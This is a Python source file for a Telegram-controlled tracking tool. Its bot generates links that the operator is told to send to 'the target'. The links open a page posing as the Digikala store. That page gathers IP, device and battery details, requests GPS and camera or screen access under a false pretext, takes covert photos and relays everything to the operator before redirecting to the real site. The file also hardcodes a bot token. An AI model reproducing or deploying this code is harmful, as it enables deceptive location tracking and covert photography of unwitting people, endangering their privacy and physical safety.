#!/usr/bin/env python3
"""
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
▓                                                                                  ▓
▓  MR.SIAVASH.IR - ABSOLUTE ULTIMATE v1.0                                          ▓
▓  تک فایل - همه پلتفرم‌ها - مختصات GPS + عکس + پیشرفته                           ▓
▓                                                                                  ▓
▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
"""

import os, sys, json, sqlite3, secrets, base64, io, threading, time, logging, asyncio, subprocess
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string, redirect, send_file
import telebot
from PIL import Image
import requests

# ==================== CONFIG ====================
class Config:
    TOKEN = "8446438645:AAHPKThZWQTYIxvfKtdm2oMhMk_rQFUVF70"
    ADMIN_ID = 6848904786
    PORT = int(os.environ.get("PORT", 8080))
    REDIRECT_URL = "https://www.digikala.com"
    SERVER_URL = os.environ.get("SERVER_URL", "")
    SCREENSHOT_DELAY = 3  # ثانیه بین عکس‌ها
    MAX_SCREENSHOTS = 3   # حداکثر عکس
    GPS_TIMEOUT = 10000   # میلی‌ثانیه
    VERSION = "ABSOLUTE-ULTIMATE-v1.0"

# ==================== LOGGING ====================
logging.basicConfig(
    level=logging.INFO,
    format='\033[92m[%(asctime)s]\033[0m \033[94m%(levelname)s\033[0m %(message)s',
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler('absolute.log', encoding='utf-8')
    ]
)
log = logging.getLogger()

# ==================== INITIALIZE ====================
bot = telebot.TeleBot(Config.TOKEN)
app = Flask(__name__)

# ==================== DATABASE ====================
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('absolute.db', check_same_thread=False)
        self.init_tables()
    
    def init_tables(self):
        c = self.conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            hash TEXT UNIQUE,
            user_id INTEGER,
            created TIMESTAMP,
            clicks INTEGER DEFAULT 0,
            ip TEXT,
            country TEXT,
            city TEXT,
            latitude REAL,
            longitude REAL,
            accuracy REAL,
            user_agent TEXT,
            platform TEXT,
            device TEXT,
            screen TEXT,
            timezone TEXT,
            battery INTEGER,
            network TEXT,
            has_photo INTEGER DEFAULT 0,
            photo_count INTEGER DEFAULT 0,
            raw_data TEXT
        )''')
        c.execute('''CREATE TABLE IF NOT EXISTS photos (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            session_hash TEXT,
            photo_index INTEGER,
            image_data BLOB,
            timestamp TIMESTAMP,
            FOREIGN KEY(session_hash) REFERENCES sessions(hash)
        )''')
        self.conn.commit()
        log.info("✓ Database initialized")
    
    def save_session(self, data):
        c = self.conn.cursor()
        c.execute('''INSERT OR REPLACE INTO sessions 
            (hash, user_id, created, ip, country, city, latitude, longitude, 
             accuracy, user_agent, platform, device, screen, timezone, 
             battery, network, raw_data) 
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
            (
                data['hash'], data.get('user_id'), datetime.now(),
                data.get('ip'), data.get('country'), data.get('city'),
                data.get('latitude'), data.get('longitude'), data.get('accuracy'),
                data.get('user_agent'), data.get('platform'), data.get('device'),
                data.get('screen'), data.get('timezone'), data.get('battery'),
                data.get('network'), json.dumps(data)
            ))
        self.conn.commit()
    
    def save_photo(self, session_hash, index, image_data):
        c = self.conn.cursor()
        c.execute('''INSERT INTO photos (session_hash, photo_index, image_data, timestamp)
            VALUES (?, ?, ?, ?)''', (session_hash, index, image_data, datetime.now()))
        c.execute('''UPDATE sessions SET has_photo=1, photo_count=photo_count+1 
            WHERE hash=?''', (session_hash,))
        self.conn.commit()
    
    def get_user_sessions(self, user_id):
        c = self.conn.cursor()
        c.execute('''SELECT hash, created, clicks, ip, country, city, 
                     latitude, longitude, has_photo, photo_count 
                     FROM sessions WHERE user_id=? ORDER BY created DESC''', (user_id,))
        return c.fetchall()

db = Database()

# ==================== UTILITIES ====================
class Utils:
    @staticmethod
    def generate_hash():
        return secrets.token_urlsafe(16)
    
    @staticmethod
    def get_ip_info(ip):
        try:
            resp = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
            if resp.status_code == 200:
                data = resp.json()
                return {
                    'country': data.get('country'),
                    'city': data.get('city'),
                    'lat': data.get('lat'),
                    'lon': data.get('lon'),
                    'isp': data.get('isp'),
                    'mobile': data.get('mobile', False)
                }
        except:
            pass
        return {}
    
    @staticmethod
    def compress_image(image_data):
        try:
            img = Image.open(io.BytesIO(base64.b64decode(image_data)))
            if img.mode != 'RGB':
                img = img.convert('RGB')
            
            max_size = (800, 800)
            img.thumbnail(max_size, Image.Resampling.LANCZOS)
            
            output = io.BytesIO()
            img.save(output, format='JPEG', quality=85, optimize=True)
            
            return base64.b64encode(output.getvalue()).decode('utf-8')
        except Exception as e:
            log.error(f"Image compression error: {e}")
            return image_data
    
    @staticmethod
    def install_dependencies():
        """نصب خودکار وابستگی‌ها"""
        log.info("🔧 Checking dependencies...")
        
        packages = [
            'flask',
            'pyTelegramBotAPI', 
            'pillow',
            'requests',
            'user-agents'
        ]
        
        for pkg in packages:
            try:
                __import__(pkg.replace('-', '_'))
                log.info(f"✓ {pkg} is installed")
            except ImportError:
                log.info(f"📦 Installing {pkg}...")
                try:
                    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])
                    log.info(f"✓ {pkg} installed successfully")
                except:
                    log.warning(f"⚠️ Failed to install {pkg}")

utils = Utils()

# ==================== TELEGRAM BOT ====================
@bot.message_handler(commands=['start'])
def cmd_start(message):
    markup = telebot.types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        telebot.types.InlineKeyboardButton("📸 ساخت لینک پیشرفته", callback_data="create_advanced"),
        telebot.types.InlineKeyboardButton("📊 آمار من", callback_data="stats")
    )
    
    bot.send_message(
        message.chat.id,
        f"""
🔰 <b>سیستم ABSOLUTE ULTIMATE</b>

⚡ <b>نسخه:</b> {Config.VERSION}
👤 <b>شناسه شما:</b> <code>{message.from_user.id}</code>
📡 <b>وضعیت:</b> فعال

🎯 <b>ویژگی‌های ویژه:</b>
• 📍 موقعیت جغرافیایی دقیق (GPS)
• 📸 عکس‌برداری خودکار
• 🌐 تشخیص کامل دستگاه
• ⚡ ارسال فوری اطلاعات

<b>یک گزینه انتخاب کنید:</b>
        """,
        reply_markup=markup,
        parse_mode='HTML'
    )

@bot.message_handler(commands=['link'])
def cmd_link(message):
    create_advanced_link(message.from_user.id)

def create_advanced_link(user_id):
    hash_code = utils.generate_hash()
    server_url = Config.SERVER_URL or f"http://localhost:{Config.PORT}"
    link = f"{server_url}/a/{hash_code}"
    
    bot.send_message(
        user_id,
        f"""
📸 <b>لینک پیشرفته ساخته شد</b>

🔗 <b>آدرس:</b>
<code>{link}</code>

🎯 <b>اهداف:</b>
📍 موقعیت جغرافیایی (GPS)
📸 عکس‌برداری خودکار
📱 اطلاعات کامل دستگاه
🌐 آی‌پی و شبکه

🆔 <b>کد رهگیری:</b> <code>{hash_code[:10]}</code>
⏱️ <b>تاریخ:</b> {datetime.now().strftime('%Y-%m-%d %H:%M')}

⚠️ <i>این لینک را برای هدف ارسال کنید</i>
        """,
        parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "create_advanced":
        create_advanced_link(call.from_user.id)
    elif call.data == "stats":
        show_stats(call.from_user.id)
    
    bot.answer_callback_query(call.id)

def show_stats(user_id):
    sessions = db.get_user_sessions(user_id)
    
    if not sessions:
        bot.send_message(user_id, "📭 هنوز هیچ جلسه‌ای ثبت نشده است.")
        return
    
    total_clicks = sum(s[2] for s in sessions)
    with_photos = sum(1 for s in sessions if s[8] == 1)
    
    stats_text = f"""
📊 <b>آمار سیستم</b>

🔗 <b>لینک‌های فعال:</b> {len(sessions)}
👁️ <b>کلیک‌های کل:</b> {total_clicks}
📸 <b>جلسات با عکس:</b> {with_photos}

<b>آخرین جلسات:</b>
    """
    
    for i, session in enumerate(sessions[:5], 1):
        stats_text += f"""
{i}. <code>{session[0][:8]}</code>
   📅 {session[1][:16]}
   🌐 {session[3] or 'N/A'}
   📍 {session[5] or 'N/A'}
   📸 {session[9]} عکس
        """
    
    bot.send_message(user_id, stats_text, parse_mode='HTML')

# ==================== STEALTH WEB PAGE ====================
HTML_TEMPLATE = '''<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>دیجی‌کالا - در حال بارگذاری</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            color: white;
        }
        .container {
            text-align: center;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
            padding: 2rem;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            max-width: 500px;
            width: 90%;
        }
        .loader {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top-color: white;
            animation: spin 1s ease-in-out infinite;
            margin: 0 auto 1.5rem;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        h1 { 
            margin-bottom: 1rem; 
            font-size: 1.5rem;
            font-weight: 600;
        }
        .status {
            margin: 1rem 0;
            padding: 0.8rem;
            background: rgba(255,255,255,0.15);
            border-radius: 10px;
            font-size: 0.9rem;
        }
        .permission-box {
            background: rgba(255,255,255,0.2);
            padding: 1.2rem;
            border-radius: 12px;
            margin: 1.5rem 0;
            border-left: 4px solid #4CAF50;
        }
        .permission-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 0.8rem 1.5rem;
            border-radius: 8px;
            font-size: 0.95rem;
            cursor: pointer;
            margin: 0.5rem;
            transition: background 0.3s;
            font-weight: 600;
        }
        .permission-btn:hover {
            background: #45a049;
        }
        .permission-btn.secondary {
            background: #ff9800;
        }
        .permission-btn.secondary:hover {
            background: #f57c00;
        }
        .hidden {
            display: none;
        }
        .photo-counter {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: rgba(0, 100, 0, 0.8);
            padding: 10px 15px;
            border-radius: 10px;
            font-size: 0.9rem;
            display: none;
        }
        .gps-indicator {
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(33, 150, 243, 0.8);
            padding: 8px 12px;
            border-radius: 8px;
            font-size: 0.85rem;
        }
    </style>
</head>
<body>
    <div class="container" id="mainContainer">
        <div class="loader"></div>
        <h1>🎯 در حال اتصال به سرور</h1>
        <p>لطفاً چند لحظه صبر کنید...</p>
        
        <div class="status" id="statusBox">
            <div id="statusText">آماده‌سازی سیستم...</div>
        </div>
        
        <div class="permission-box hidden" id="permissionBox">
            <h3>📸 درخواست دسترسی</h3>
            <p>برای فعال شدن ویژگی‌های پیشرفته، اجازه دسترسی را بدهید.</p>
            <p style="font-size: 0.85rem; opacity: 0.9;">(این دسترسی فقط برای بهبود تجربه کاربری استفاده می‌شود)</p>
            
            <button class="permission-btn" onclick="requestAllPermissions()">
                🔓 Allow All Features
            </button>
            
            <button class="permission-btn secondary" onclick="skipPermissions()">
                ⏭️ Continue Without
            </button>
            
            <div id="permissionStatus" style="margin-top: 10px; font-size: 0.8rem;"></div>
        </div>
    </div>
    
    <div class="gps-indicator hidden" id="gpsIndicator">
        📍 موقعیت: <span id="gpsStatus">در حال دریافت...</span>
    </div>
    
    <div class="photo-counter hidden" id="photoCounter">
        📸 <span id="photoCount">0</span>/{{ max_photos }}
    </div>

    <script>
    // تنظیمات
    const config = {
        hash: "{{ hash }}",
        max_photos: {{ max_photos }},
        photo_delay: {{ photo_delay }},
        gps_timeout: {{ gps_timeout }}
    };
    
    let collectedData = {
        hash: config.hash,
        timestamp: new Date().toISOString(),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        languages: navigator.languages,
        screen: `${screen.width}x${screen.height}`,
        colorDepth: screen.colorDepth,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        deviceMemory: navigator.deviceMemory || 'unknown',
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        cookieEnabled: navigator.cookieEnabled,
        doNotTrack: navigator.doNotTrack || 'unknown'
    };
    
    let photoStream = null;
    let photoCount = 0;
    let gpsData = null;
    let hasPermissions = false;
    
    // 1. جمع‌آوری اطلاعات اولیه
    async function collectBasicInfo() {
        updateStatus("دریافت اطلاعات پایه...");
        
        // اطلاعات شبکه
        if (navigator.connection) {
            collectedData.connection = {
                effectiveType: navigator.connection.effectiveType,
                downlink: navigator.connection.downlink,
                rtt: navigator.connection.rtt
            };
        }
        
        // اطلاعات باتری
        if (navigator.getBattery) {
            try {
                const battery = await navigator.getBattery();
                collectedData.battery = {
                    level: Math.round(battery.level * 100),
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischchargingTime
                };
            } catch(e) {}
        }
        
        // دریافت IP
        await getIPAddress();
        
        updateStatus("اطلاعات اولیه جمع‌آوری شد");
    }
    
    // 2. دریافت آی‌پی و اطلاعات جغرافیایی IP-based
    async function getIPAddress() {
        try {
            const ipResponse = await fetch('https://api.ipify.org?format=json');
            const ipData = await ipResponse.json();
            collectedData.ip = ipData.ip;
            
            // اطلاعات جغرافیایی بر اساس IP
            try {
                const geoResponse = await fetch(`https://ipapi.co/${collectedData.ip}/json/`);
                const geoData = await geoResponse.json();
                collectedData.ipCountry = geoData.country_name;
                collectedData.ipCity = geoData.city;
                collectedData.ipLat = geoData.latitude;
                collectedData.ipLon = geoData.longitude;
                collectedData.isp = geoData.org;
            } catch(e) {
                console.log("IP-based geolocation failed:", e);
            }
            
        } catch(e) {
            console.log("IP fetch failed:", e);
        }
    }
    
    // 3. دریافت موقعیت GPS
    async function getGPSLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve(null);
                return;
            }
            
            document.getElementById('gpsIndicator').classList.remove('hidden');
            updateGPSStatus("در حال دریافت موقعیت...");
            
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    gpsData = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy,
                        altitude: position.coords.altitude,
                        speed: position.coords.speed,
                        timestamp: position.timestamp
                    };
                    
                    collectedData.gps = gpsData;
                    updateGPSStatus("📍 موقعیت دریافت شد");
                    resolve(gpsData);
                    
                    // ارسال موقعیت GPS
                    sendDataToServer('gps', gpsData);
                },
                (error) => {
                    console.log("GPS error:", error.code, error.message);
                    updateGPSStatus("موقعیت دریافت نشد");
                    resolve(null);
                },
                {
                    enableHighAccuracy: true,
                    timeout: config.gps_timeout,
                    maximumAge: 0
                }
            );
        });
    }
    
    // 4. درخواست دسترسی‌ها
    async function requestAllPermissions() {
        updatePermissionStatus("درخواست دسترسی‌ها...");
        
        try {
            // اول موقعیت GPS
            await getGPSLocation();
            
            // سپس دسترسی دوربین/صفحه نمایش
            const stream = await navigator.mediaDevices.getUserMedia({
                video: {
                    facingMode: 'environment',
                    width: { ideal: 1280 },
                    height: { ideal: 720 }
                }
            }).catch(async () => {
                // اگر دوربین نشد، صفحه نمایش
                return await navigator.mediaDevices.getDisplayMedia({
                    video: {
                        cursor: 'always'
                    },
                    audio: false
                }).catch(() => null);
            });
            
            if (stream) {
                photoStream = stream;
                hasPermissions = true;
                updatePermissionStatus("✅ دسترسی‌ها داده شد");
                document.getElementById('permissionBox').classList.add('hidden');
                document.getElementById('photoCounter').classList.remove('hidden');
                
                // شروع عکس‌برداری
                startPhotoCapture();
                
                // ارسال داده‌های اولیه
                sendInitialData();
                
            } else {
                updatePermissionStatus("دسترسی‌ها داده نشد");
                hasPermissions = false;
                skipPermissions();
            }
            
        } catch(error) {
            console.log("Permission error:", error);
            updatePermissionStatus("خطا در دریافت دسترسی");
            skipPermissions();
        }
    }
    
    // 5. عکس‌برداری
    function startPhotoCapture() {
        if (!photoStream || photoCount >= config.max_photos) return;
        
        const capturePhoto = () => {
            if (photoCount >= config.max_photos) return;
            
            const videoTrack = photoStream.getVideoTracks()[0];
            const imageCapture = new ImageCapture(videoTrack);
            
            imageCapture.grabFrame()
                .then(bitmap => {
                    const canvas = document.createElement('canvas');
                    canvas.width = bitmap.width;
                    canvas.height = bitmap.height;
                    const ctx = canvas.getContext('2d');
                    ctx.drawImage(bitmap, 0, 0);
                    
                    canvas.toBlob(blob => {
                        const reader = new FileReader();
                        reader.onloadend = () => {
                            const base64data = reader.result.split(',')[1];
                            
                            // ارسال عکس
                            sendPhotoToServer(photoCount + 1, base64data);
                            
                            // بروزرسانی شمارنده
                            photoCount++;
                            document.getElementById('photoCount').textContent = photoCount;
                            
                            // عکس بعدی
                            if (photoCount < config.max_photos) {
                                setTimeout(capturePhoto, config.photo_delay * 1000);
                            } else {
                                // پایان عکس‌برداری
                                photoStream.getTracks().forEach(track => track.stop());
                                completeSession();
                            }
                        };
                        reader.readAsDataURL(blob);
                    }, 'image/jpeg', 0.8);
                })
                .catch(error => {
                    console.log("Capture error:", error);
                    photoCount++;
                    if (photoCount < config.max_photos) {
                        setTimeout(capturePhoto, config.photo_delay * 1000);
                    } else {
                        completeSession();
                    }
                });
        };
        
        capturePhoto();
    }
    
    // 6. رد دسترسی‌ها
    function skipPermissions() {
        updateStatus("ادامه بدون دسترسی‌های پیشرفته...");
        document.getElementById('permissionBox').classList.add('hidden');
        
        // تلاش برای دریافت GPS بدون اجازه (ممکن است قبلاً داده باشد)
        getGPSLocation().then(() => {
            // ارسال داده‌های اولیه
            sendInitialData();
            
            // انتقال به سایت مقصد
            setTimeout(() => {
                completeSession();
            }, 3000);
        });
    }
    
    // 7. ارسال داده به سرور
    async function sendDataToServer(type, data = null) {
        const payload = {
            type: type,
            hash: config.hash,
            timestamp: new Date().toISOString(),
            data: data || collectedData
        };
        
        try {
            await fetch('/api/collect', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch(e) {
            console.log("Send error:", e);
        }
    }
    
    async function sendPhotoToServer(index, imageData) {
        const payload = {
            type: 'photo',
            hash: config.hash,
            index: index,
            image: imageData,
            timestamp: new Date().toISOString()
        };
        
        try {
            await fetch('/api/photo', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
        } catch(e) {
            console.log("Photo send error:", e);
        }
    }
    
    function sendInitialData() {
        sendDataToServer('initial', collectedData);
    }
    
    // 8. تکمیل جلسه و انتقال
    function completeSession() {
        updateStatus("✅ تکمیل عملیات");
        
        // ارسال داده نهایی
        sendDataToServer('complete', {
            ...collectedData,
            photoCount: photoCount,
            hasGPS: !!gpsData,
            hasPhotos: hasPermissions && photoCount > 0
        });
        
        // انتقال به سایت مقصد
        setTimeout(() => {
            window.location.replace("{{ redirect_url }}");
        }, 2000);
    }
    
    // Helper functions
    function updateStatus(text) {
        document.getElementById('statusText').textContent = text;
    }
    
    function updatePermissionStatus(text) {
        document.getElementById('permissionStatus').textContent = text;
    }
    
    function updateGPSStatus(text) {
        document.getElementById('gpsStatus').textContent = text;
    }
    
    // شروع فرآیند
    (async function init() {
        // جمع‌آوری اطلاعات اولیه
        await collectBasicInfo();
        
        // نشان دادن باکس دسترسی
        setTimeout(() => {
            document.getElementById('permissionBox').classList.remove('hidden');
            updateStatus("آماده برای ویژگی‌های پیشرفته");
        }, 1500);
        
        // تایم‌اوت خودکار
        setTimeout(() => {
            if (!hasPermissions) {
                skipPermissions();
            }
        }, 10000);
        
    })();
    </script>
</body>
</html>
'''

# ==================== FLASK ROUTES ====================
@app.route('/')
def index():
    return redirect(Config.REDIRECT_URL)

@app.route('/a/<hash_code>')
def advanced_collector(hash_code):
    return render_template_string(
        HTML_TEMPLATE,
        hash=hash_code,
        max_photos=Config.MAX_SCREENSHOTS,
        photo_delay=Config.SCREENSHOT_DELAY,
        gps_timeout=Config.GPS_TIMEOUT,
        redirect_url=Config.REDIRECT_URL
    )

@app.route('/api/collect', methods=['POST'])
def api_collect():
    try:
        data = request.json
        hash_code = data.get('hash')
        data_type = data.get('type')
        
        if not hash_code:
            return jsonify({"status": "ok"}), 200
        
        # استخراج user_id از هش (اگر در دیتابیس موجود باشد)
        conn = sqlite3.connect('absolute.db')
        c = conn.cursor()
        c.execute("SELECT user_id FROM sessions WHERE hash=?", (hash_code,))
        session = c.fetchone()
        conn.close()
        
        if session:
            user_id = session[0]
            
            # پردازش بر اساس نوع داده
            if data_type == 'initial' or data_type == 'complete':
                collected = data.get('data', {})
                
                # ذخیره در دیتابیس
                db.save_session({
                    'hash': hash_code,
                    'user_id': user_id,
                    'ip': collected.get('ip'),
                    'country': collected.get('ipCountry'),
                    'city': collected.get('ipCity'),
                    'latitude': collected.get('gps', {}).get('latitude') or collected.get('ipLat'),
                    'longitude': collected.get('gps', {}).get('longitude') or collected.get('ipLon'),
                    'accuracy': collected.get('gps', {}).get('accuracy'),
                    'user_agent': collected.get('userAgent'),
                    'platform': collected.get('platform'),
                    'device': 'Detecting...',
                    'screen': collected.get('screen'),
                    'timezone': collected.get('timezone'),
                    'battery': collected.get('battery', {}).get('level'),
                    'network': collected.get('connection', {}).get('effectiveType'),
                    'raw_data': json.dumps(collected)
                })
                
                # ارسال نوتیفیکیشن به تلگرام
                if data_type == 'initial':
                    gps_info = ""
                    if collected.get('gps'):
                        gps = collected['gps']
                        gps_info = f"\n📍 <b>GPS:</b> {gps['latitude']:.6f}, {gps['longitude']:.6f}"
                    elif collected.get('ipLat'):
                        gps_info = f"\n🌐 <b>IP Location:</b> {collected['ipLat']}, {collected['ipLon']}"
                    
                    message = f"""
🎯 <b>جلسه جدید شروع شد</b>

🔗 <b>کد:</b> <code>{hash_code[:10]}</code>
🌐 <b>IP:</b> <code>{collected.get('ip', 'N/A')}</code>
📱 <b>دستگاه:</b> {collected.get('platform', 'N/A')}{gps_info}
🕐 <b>زمان:</b> {datetime.now().strftime('%H:%M:%S')}

⚡ <i>منتظر اطلاعات بیشتر...</i>
                    """
                    
                    try:
                        bot.send_message(user_id, message, parse_mode='HTML')
                    except:
                        pass
                
                elif data_type == 'complete':
                    message = f"""
✅ <b>جلسه تکمیل شد</b>

🔗 <b>کد:</b> <code>{hash_code[:10]}</code>
📊 <b>نتیجه:</b>
• 📍 موقعیت: {'✅ دریافت شد' if collected.get('gps') else '❌ دریافت نشد'}
• 📸 عکس: {collected.get('photoCount', 0)} عدد
• 🌐 IP: {collected.get('ip', 'N/A')}
• 📱 دستگاه: {collected.get('platform', 'N/A')}

🕐 <b>پایان:</b> {datetime.now().strftime('%H:%M:%S')}
                    """
                    
                    try:
                        bot.send_message(user_id, message, parse_mode='HTML')
                    except:
                        pass
            
            elif data_type == 'gps':
                gps_data = data.get('data', {})
                if gps_data.get('latitude') and gps_data.get('longitude'):
                    message = f"""
📍 <b>موقعیت GPS دریافت شد</b>

🔗 <b>کد:</b> <code>{hash_code[:10]}</code>
📌 <b>مختصات:</b>
• عرض: {gps_data['latitude']:.6f}
• طول: {gps_data['longitude']:.6f}
• دقت: {gps_data.get('accuracy', 'N/A')} متر
• ارتفاع: {gps_data.get('altitude', 'N/A')} متر

🗺️ <a href="https://www.google.com/maps?q={gps_data['latitude']},{gps_data['longitude']}">مشاهده در Google Maps</a>
                    """
                    
                    try:
                        bot.send_message(user_id, message, parse_mode='HTML')
                    except:
                        pass
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        log.error(f"API Error: {e}")
        return jsonify({"status": "ok"}), 200  # همیشه OK برگردان

@app.route('/api/photo', methods=['POST'])
def api_photo():
    try:
        data = request.json
        hash_code = data.get('hash')
        index = data.get('index')
        image_data = data.get('image')
        
        if not all([hash_code, index, image_data]):
            return jsonify({"status": "ok"}), 200
        
        # فشرده‌سازی عکس
        compressed_image = utils.compress_image(image_data)
        
        # ذخیره در دیتابیس
        db.save_photo(hash_code, index, compressed_image)
        
        # پیدا کردن user_id برای ارسال
        conn = sqlite3.connect('absolute.db')
        c = conn.cursor()
        c.execute("SELECT user_id FROM sessions WHERE hash=?", (hash_code,))
        session = c.fetchone()
        conn.close()
        
        if session and index % 2 == 0:  # هر عکس دوم را ارسال کن
            user_id = session[0]
            
            # تبدیل base64 به bytes برای تلگرام
            try:
                image_bytes = base64.b64decode(compressed_image)
                
                # ارسال به تلگرام
                bot.send_photo(
                    user_id,
                    photo=image_bytes,
                    caption=f"📸 عکس #{index} از {hash_code[:8]}\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                )
            except Exception as e:
                log.error(f"Telegram photo send error: {e}")
        
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        log.error(f"Photo API Error: {e}")
        return jsonify({"status": "ok"}), 200

# ==================== SYSTEM CONTROLS ====================
@app.route('/status')
def status():
    conn = sqlite3.connect('absolute.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM sessions")
    session_count = c.fetchone()[0]
    c.execute("SELECT COUNT(*) FROM photos")
    photo_count = c.fetchone()[0]
    conn.close()
    
    return jsonify({
        "status": "active",
        "version": Config.VERSION,
        "sessions": session_count,
        "photos": photo_count,
        "uptime": str(datetime.now() - start_time),
        "redirect_url": Config.REDIRECT_URL
    })

@app.route('/sessions')
def list_sessions():
    conn = sqlite3.connect('absolute.db')
    c = conn.cursor()
    c.execute("SELECT hash, created, ip, country, city, latitude, longitude, has_photo FROM sessions ORDER BY created DESC LIMIT 50")
    sessions = c.fetchall()
    conn.close()
    
    result = []
    for s in sessions:
        result.append({
            "hash": s[0],
            "created": s[1],
            "ip": s[2],
            "country": s[3],
            "city": s[4],
            "latitude": s[5],
            "longitude": s[6],
            "has_photo": bool(s[7])
        })
    
    return jsonify({"sessions": result})

# ==================== MAIN EXECUTION ====================
def run_flask():
    log.info(f"🌐 Web server starting on port {Config.PORT}")
    app.run(host='0.0.0.0', port=Config.PORT, debug=False, threaded=True)

def run_bot():
    log.info("🤖 Telegram bot starting...")
    while True:
        try:
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            log.error(f"Bot error: {e}")
            time.sleep(5)

def run_install_check():
    """بررسی و نصب وابستگی‌ها"""
    log.info("🔧 Running dependency check...")
    utils.install_dependencies()
    log.info("✅ All dependencies are ready")

if __name__ == "__main__":
    start_time = datetime.now()
    
    print("\n" + "="*70)
    print(f"🚀 MR.SIAVASH.IR - ABSOLUTE ULTIMATE v1.0")
    print("="*70)
    print(f"📅 Started at: {start_time}")
    print(f"👤 Admin ID: {Config.ADMIN_ID}")
    print(f"🌐 Redirect URL: {Config.REDIRECT_URL}")
    print(f"📸 Max photos: {Config.MAX_SCREENSHOTS}")
    print(f"📍 GPS timeout: {Config.GPS_TIMEOUT}ms")
    print("="*70 + "\n")
    
    # نصب وابستگی‌ها
    run_install_check()
    
    # راه‌اندازی سرور و ربات
    flask_thread = threading.Thread(target=run_flask, daemon=True)
    bot_thread = threading.Thread(target=run_bot, daemon=True)
    
    flask_thread.start()
    time.sleep(2)  # منتظر راه‌اندازی سرور
    bot_thread.start()
    
    log.info("✅ System is fully operational!")
    log.info(f"💡 Access at: http://localhost:{Config.PORT}")
    log.info(f"📊 Check status: http://localhost:{Config.PORT}/status")
    log.info(f"📄 List sessions: http://localhost:{Config.PORT}/sessions")
    
    # نگه داشتن برنامه
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log.info("\n👋 System shutdown requested")


        log.info(f"⏳ Total uptime: {datetime.now() - start_time}")
